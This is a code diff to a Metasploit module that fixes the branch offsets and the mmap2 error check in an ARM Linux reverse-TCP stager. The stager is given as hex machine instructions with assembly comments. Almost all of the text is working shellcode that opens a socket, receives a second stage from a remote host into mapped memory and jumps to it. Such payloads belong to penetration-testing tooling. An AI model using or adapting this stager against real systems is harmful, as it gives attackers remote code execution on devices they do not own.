@@ -39,6 +39,7 @@ module MetasploitModule
             },
           'Payload' =>
           [
+            # Generated from external/source/shellcode/linux/armle/stager_sock_reverse.s
             0xe59f70f0,          #        ldr     r7, [pc, #240]    ; set 281(0x119) to r7
             0xe3a00002,          #        mov     r0, #2
             0xe3a01001,          #        mov     r1, #1
@@ -75,8 +76,8 @@ module MetasploitModule
             0xe1a04000,          #        mov     r4, r0
             0xe3a05000,          #        mov     r5, #0
             0xef000000,          #        svc     0x00000000        ; invoke mmap2
-            0xe3500000,          #        cmp     r0, #0
-            0xba000012,          #        blt 817c <failed>
+            0xe3700001,          #        cmn     r0, #1
+            0x0a000012,          #        beq     <failed>
             0xe2877063,          #        add     r7, r7, #99       ; set 291(0x123) to r7
             0xe1a01000,          #        mov     r1, r0
             0xe1a0000c,          #        mov     r0, ip
@@ -86,17 +87,17 @@ module MetasploitModule
             0xe2422ffa,          #        sub     r2, r2, #1000
             0xe58d2000,          #        str     r2, [sp]
             0xe3520000,          #        cmp     r2, #0
-            0xda000002,          #        ble     80fc <last>
+            0xda000004,          #        ble     80fc <last>
             0xe3a02ffa,          #        mov     r2, #1000
             0xef000000,          #        svc     0x00000000        ; invoke recv
             0xe3500000,          #        cmp     r0, #0
             0xba000005,          #        blt     817c <failed>
-            0xeafffff7,          #        b       80dc <loop>
+            0xeafffff5,          #        b       80dc <loop>
                                  #  last:
             0xe2822ffa,          #        add     r2, r2, #1000
             0xef000000,          #        svc     0x00000000        ; invoke recv
-            0xe3500000,          #        cmp r0, #0
-            0xba000000,          #        blt 817c <failed>
+            0xe3500000,          #        cmp     r0, #0
+            0xba000000,          #        blt     817c <failed>
             0xe1a0f001,          #        mov     pc, r1
                                  #  failed:
             0xe3a07001,          #        mov r7, #1
